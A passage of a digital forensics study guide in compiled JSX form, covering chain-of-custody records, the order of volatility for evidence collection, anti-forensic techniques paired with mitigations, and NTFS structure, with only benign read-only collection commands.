        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Item Description"
        }), " → make, model, serial number, unique identifiers"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Evidence Type"
        }), " → physical (hard drive, phone) or logical (image file, memory dump)"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Collection Information"
        }), " → who collected, when (date/time), where (location)"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Hash Values"
        }), " → MD5, SHA-1, and/or SHA-256 of the evidence at collection"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Transfer Log"
        }), " → every person who handled the evidence with dates and purpose of transfer"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Security Method"
        }), " → how evidence was stored (safe, encrypted container, sealed bag)"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Disposition"
        }), " → final location or destruction of evidence"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "sample-chain-of-custody-form-text-format",
      children: "Sample Chain of Custody Form (Text Format)"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "╔══════════════════════════════════════════════════════════════╗\n║              CHAIN OF CUSTODY FORM                          ║\n║              Case #: IR-2024-001                            ║\n╚══════════════════════════════════════════════════════════════╝\n\nITEM DESCRIPTION:\n-----------------\nType: SATA SSD, 500 GB, Samsung 870 EVO\nSerial Number: S6P5NB0R123456\nHost System: HR-01 (Dell Optiplex 7080, SN: ABC123)\nCollection Location: Building A, Floor 3, Office 304\n\nHASH VALUES:\n------------\nSHA-256 (original): a8f5f167f44f4964e6c998d67f3b3b9e7a2c3d4e5f6a7b8c9d0e1f2a3b4c5d6\nSHA-256 (image):    a8f5f167f44f4964e6c998d67f3b3b9e7a2c3d4e5f6a7b8c9d0e1f2a3b4c5d6\nMD5 (original):     4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b\n\nTRANSFER LOG:\n-------------\n| # | Date/Time (UTC) | From          | To            | Purpose              | Signature |\n|---|-----------------|---------------|---------------|----------------------|-----------|\n| 1 | 2024-06-15 14:30| John Smith    | Lab Intake    | Evidence submission  | JSmith    |\n|   |                 | (Responder)   |               |                      |           |\n| 2 | 2024-06-15 15:00| Lab Intake    | Sarah Jones   | Disk imaging         | SJones    |\n|   |                 |               | (Forensic     |                      |           |\n|   |                 |               | Analyst)      |                      |           |\n| 3 | 2024-06-16 09:00| Sarah Jones   | Evidence Safe | Overnight storage    | SJones    |\n|   |                 |               | (Room 101)    |                      |           |\n| 4 | 2024-06-16 10:00| Evidence Safe | Mike Chen     | File system analysis | MChen     |\n|   |                 |               | (Analyst)     |                      |           |\n| 5 | 2024-06-20 16:00| Mike Chen     | Evidence Safe | Final storage        | MChen     |\n|   |                 |               | (Room 101)    |                      |           |\n\nDISPOSITION:\n------------\nReturned to owner (IT department) on 2024-07-01.\nReceipt signed by Jane Doe, IT Manager.\n\nEVIDENCE OFFICER: _______________________  Date: _____________\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "legal-standards-for-chain-of-custody",
      children: "Legal Standards for Chain of Custody"
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Federal Rules of Evidence (FRE) 901"
        }), " → evidence must be authenticated with proof it is what it claims to be"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Daubert Standard"
        }), " → forensic methodology must be scientifically valid and testable"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Frye Standard"
        }), " → methods must be \"generally accepted\" in the scientific community"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Best Evidence Rule (FRE 1002)"
        }), " → original evidence preferred over copies (hash verification satisfies this)"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "chain-of-custody-violations-that-invalidate-evidence",
      children: "Chain of Custody Violations That Invalidate Evidence"
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Gaps in timeline"
        }), " → unaccounted periods where evidence was unsupervised"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Unverifiable hashes"
        }), " → hash mismatch between collection and analysis"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Improper storage"
        }), " → evidence stored in uncontrolled environment (temperature, humidity, access)"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Unauthorized access"
        }), " → person without clearance handled evidence"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Missing signatures"
        }), " → required signatory did not complete form"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Late documentation"
        }), " → forms filled out days after the transfer"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "edge-cases",
      children: "Edge Cases"
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Virtual evidence"
        }), " → logs from cloud providers may be stored across multiple jurisdictions"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Shared custody"
        }), " → multiple agencies investigating the same case must maintain coordinated CoC"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Classified evidence"
        }), " → additional clearance documentation required for each transfer"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Cross-border transfers"
        }), " → different countries have different evidence handling laws"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "3-order-of-volatility",
      children: "3. Order of Volatility"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Real-World Analogy:"
      }), " When a chef finds a bug in the kitchen, the first thing they check is the fresh ingredients on the counter (they spoil fastest), then the refrigerator, then the freezer, then the pantry. Digital evidence has the same \"spoilage\" scale → data in RAM disappears in milliseconds, while data on a backup tape lasts years."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "The Order of Volatility (OOV) dictates the sequence in which digital evidence must be collected → from most volatile to least volatile. This is critical because collecting lower-volatility evidence first may destroy higher-volatility evidence."
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "the-order-of-volatility-table",
      children: "The Order of Volatility Table"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Rank"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Evidence Type"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Description"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Volatility"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Collection Window"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Collection Tool"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "1"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "CPU Registers / Cache"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Processor state, instruction pointer"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Nanoseconds"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Instant"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Hardware debugger, JTAG"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "2"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Routing Tables / ARP Cache"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Network path information"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Milliseconds"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Seconds"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsx)(_components.code, {
              children: "arp -a"
            }), ", ", (0,jsx_runtime.jsx)(_components.code, {
              children: "netstat -rn"
            })]
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "3"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "RAM (Physical Memory)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Running processes, network connections, loaded DLLs, decrypted data"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Milliseconds to seconds"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Minutes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "LiME, FTK Imager, WinPmem, dumpit"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "4"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Temporary File Systems"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "/tmp, /var/tmp, browser cache"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Seconds to minutes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Minutes"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsx)(_components.code, {
              children: "lsof +L1"
            }), ", ", (0,jsx_runtime.jsx)(_components.code, {
              children: "ls -la /tmp"
            })]
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "5"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Disk (Non-volatile)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "File system data, installed programs, user files"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Minutes to years"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Hours"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "dd, Guymager, FTK Imager"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "6"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Removable Media"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "USB drives, external HDDs, SD cards"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Minutes to years"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Minutes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "dd, pyUSB"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "7"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Logs (Remote)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "SIEM, firewall, DNS, proxy logs"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Hours to years"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Days"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "API export, syslog"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "8"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Backups / Archives"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Tape backups, cloud snapshots, offline archives"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Months to years"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Weeks"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Backup software export"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "9"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Configuration / Documentation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Network diagrams, asset inventories, policies"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Years"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Unlimited"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Manual collection"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "collection-timing-guidelines",
      children: "Collection Timing Guidelines"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Rank"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Collection Must Begin Within"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Acceptable Delay"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "1-2"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Immediate (seconds)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Not acceptable"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "3"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Within 5 minutes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Up to 15 minutes"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "4"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Within 15 minutes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Up to 1 hour"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "5"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Within 1 hour"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Up to 1 day"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "6"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Within 2 hours"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Up to 1 day"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "7"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Within 1 day"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Up to 1 week"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "8"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Within 1 week"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Up to 1 month"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "9"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "No time pressure"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Not applicable"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "anti-forensics-impact-on-volatility",
      children: "Anti-Forensics Impact on Volatility"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Anti-Forensic Technique"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Volatility Impact"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Mitigation"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Process hiding (rootkit)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Hides rank 3 evidence"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Use Volatility kdbgscan"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Log deletion"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Destroys rank 7"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Centralized logging (SIEM)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Timestomping"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Corrupts rank 5 metadata"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: ["Compare MFT ", (0,jsx_runtime.jsxs)(_components.span, {
              className: "katex",
              children: [(0,jsx_runtime.jsx)(_components.span, {
                className: "katex-mathml",
                children: (0,jsx_runtime.jsx)(_components.math, {
                  xmlns: "http://www.w3.org/1998/Math/MathML",
                  children: (0,jsx_runtime.jsxs)(_components.semantics, {
                    children: [(0,jsx_runtime.jsxs)(_components.mrow, {
                      children: [(0,jsx_runtime.jsx)(_components.mi, {
                        children: "S"
                      }), (0,jsx_runtime.jsx)(_components.mi, {
                        children: "T"
                      }), (0,jsx_runtime.jsx)(_components.mi, {
                        children: "A"
                      }), (0,jsx_runtime.jsx)(_components.mi, {
                        children: "N"
                      }), (0,jsx_runtime.jsx)(_components.mi, {
                        children: "D"
                      }), (0,jsx_runtime.jsx)(_components.mi, {
                        children: "A"
                      }), (0,jsx_runtime.jsx)(_components.mi, {
                        children: "R"
                      }), (0,jsx_runtime.jsxs)(_components.msub, {
                        children: [(0,jsx_runtime.jsx)(_components.mi, {
                          children: "D"
                        }), (0,jsx_runtime.jsx)(_components.mi, {
                          children: "I"
                        })]
                      }), (0,jsx_runtime.jsx)(_components.mi, {
                        children: "N"
                      }), (0,jsx_runtime.jsx)(_components.mi, {
                        children: "F"
                      }), (0,jsx_runtime.jsx)(_components.mi, {
                        children: "O"
                      }), (0,jsx_runtime.jsx)(_components.mi, {
                        children: "R"
                      }), (0,jsx_runtime.jsx)(_components.mi, {
                        children: "M"
                      }), (0,jsx_runtime.jsx)(_components.mi, {
                        children: "A"
                      }), (0,jsx_runtime.jsx)(_components.mi, {
                        children: "T"
                      }), (0,jsx_runtime.jsx)(_components.mi, {
                        children: "I"
                      }), (0,jsx_runtime.jsx)(_components.mi, {
                        children: "O"
                      }), (0,jsx_runtime.jsx)(_components.mi, {
                        children: "N"
                      }), (0,jsx_runtime.jsx)(_components.mi, {
                        children: "v"
                      }), (0,jsx_runtime.jsx)(_components.mi, {
                        children: "s"
                      })]
                    }), (0,jsx_runtime.jsx)(_components.annotation, {
                      encoding: "application/x-tex",
                      children: "STANDARD_INFORMATION vs "
                    })]
                  })
                })
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "katex-html",
                "aria-hidden": "true",
                children: (0,jsx_runtime.jsxs)(_components.span, {
                  className: "base",
                  children: [(0,jsx_runtime.jsx)(_components.span, {
                    className: "strut",
                    style: {
                      height: "0.8333em",
                      verticalAlign: "-0.15em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord mathnormal",
                    style: {
                      marginRight: "0.0576em"
                    },
                    children: "S"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord mathnormal",
                    style: {
                      marginRight: "0.1389em"
                    },
                    children: "T"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord mathnormal",
                    children: "A"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord mathnormal",
                    style: {
                      marginRight: "0.109em"
                    },
                    children: "N"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord mathnormal",
                    style: {
                      marginRight: "0.0278em"
                    },
                    children: "D"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord mathnormal",
                    children: "A"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord mathnormal",
                    style: {
                      marginRight: "0.0077em"
                    },
                    children: "R"
                  }), (0,jsx_runtime.jsxs)(_components.span, {
                    className: "mord",
                    children: [(0,jsx_runtime.jsx)(_components.span, {
                      className: "mord mathnormal",
                      style: {
                        marginRight: "0.0278em"
                      },
                      children: "D"
                    }), (0,jsx_runtime.jsx)(_components.span, {
                      className: "msupsub",
                      children: (0,jsx_runtime.jsxs)(_components.span, {
                        className: "vlist-t vlist-t2",
                        children: [(0,jsx_runtime.jsxs)(_components.span, {
                          className: "vlist-r",
                          children: [(0,jsx_runtime.jsx)(_components.span, {
                            className: "vlist",
                            style: {
                              height: "0.3283em"
                            },
                            children: (0,jsx_runtime.jsxs)(_components.span, {
                              style: {
                                top: "-2.55em",
                                marginLeft: "-0.0278em",
                                marginRight: "0.05em"
                              },
                              children: [(0,jsx_runtime.jsx)(_components.span, {
                                className: "pstrut",
                                style: {
                                  height: "2.7em"
                                }
                              }), (0,jsx_runtime.jsx)(_components.span, {
                                className: "sizing reset-size6 size3 mtight",
                                children: (0,jsx_runtime.jsx)(_components.span, {
                                  className: "mord mathnormal mtight",
                                  style: {
                                    marginRight: "0.0785em"
                                  },
                                  children: "I"
                                })
                              })]
                            })
                          }), (0,jsx_runtime.jsx)(_components.span, {
                            className: "vlist-s",
                            children: "​"
                          })]
                        }), (0,jsx_runtime.jsx)(_components.span, {
                          className: "vlist-r",
                          children: (0,jsx_runtime.jsx)(_components.span, {
                            className: "vlist",
                            style: {
                              height: "0.15em"
                            },
                            children: (0,jsx_runtime.jsx)(_components.span, {})
                          })
                        })]
                      })
                    })]
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord mathnormal",
                    style: {
                      marginRight: "0.109em"
                    },
                    children: "N"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord mathnormal",
                    style: {
                      marginRight: "0.1389em"
                    },
                    children: "F"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord mathnormal",
                    style: {
                      marginRight: "0.0278em"
                    },
                    children: "O"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord mathnormal",
                    style: {
                      marginRight: "0.0077em"
                    },
                    children: "R"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord mathnormal",
                    style: {
                      marginRight: "0.109em"
                    },
                    children: "M"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord mathnormal",
                    children: "A"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord mathnormal",
                    style: {
                      marginRight: "0.1389em"
                    },
                    children: "T"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord mathnormal",
                    style: {
                      marginRight: "0.0785em"
                    },
                    children: "I"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord mathnormal",
                    style: {
                      marginRight: "0.0278em"
                    },
                    children: "O"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord mathnormal",
                    style: {
                      marginRight: "0.109em"
                    },
                    children: "N"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord mathnormal",
                    style: {
                      marginRight: "0.0359em"
                    },
                    children: "v"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord mathnormal",
                    children: "s"
                  })]
                })
              })]
            }), "FILE_NAME"]
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Disk wiping"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Destroys rank 5"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Capture before wipe command completes"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "RAM Trashing"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Overwrites rank 3"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Immediate collection before tool runs"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Encryption"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Makes rank 3-5 inaccessible"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Capture keys from RAM first"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "edge-cases-in-order-of-volatility",
      children: "Edge Cases in Order of Volatility"
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Virtual Machines:"
        }), " VM snapshots (.vmem, .vmsn) capture CPU registers + RAM as a file → treat as both rank 1 and 5"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Containers:"
        }), " Docker container file systems are ephemeral → rank 4, collect before stopping the container"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Cloud Instances:"
        }), " Auto-scaling groups may terminate instances → rank 3-5 disappears instantly"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Solid State Drives:"
        }), " TRIM garbage collection destroys deleted data → treat as higher volatility than HDD"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "RAM on Mobiles:"
        }), " Encrypted by default (iOS since iPhone 5s, Android since 6.0) → rank 3 with encryption wall"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "4-disk-forensics",
      children: "4. Disk Forensics"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Real-World Analogy:"
      }), " A library has a card catalog (MFT) that lists every book and where it sits. When a book is \"returned\" (deleted), the card is moved to a \"free\" pile → but the book is still on the shelf until the shelf space is needed for a new book. Disk forensics is about reading the card catalog and finding books that were marked as returned but never reshelved."]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "41-file-system-overview",
      children: "4.1 File System Overview"
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "ntfs-new-technology-file-system",
      children: "NTFS (New Technology File System)"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Structure:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "MBR / GPT"
        }), " → partition table at the start of the disk"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "VBR (Volume Boot Record)"
        }), " → first sector of the NTFS volume"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "$MFT (Master File Table)"
        }), " → central directory of all files and folders"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "$MFTMirr"
        }), " → mirror of the first 4 MFT entries (stored in the middle of the volume)"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Clusters"
        }), " → logical allocation units (typically 4 KB)"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Key NTFS Metadata Files:"
      })
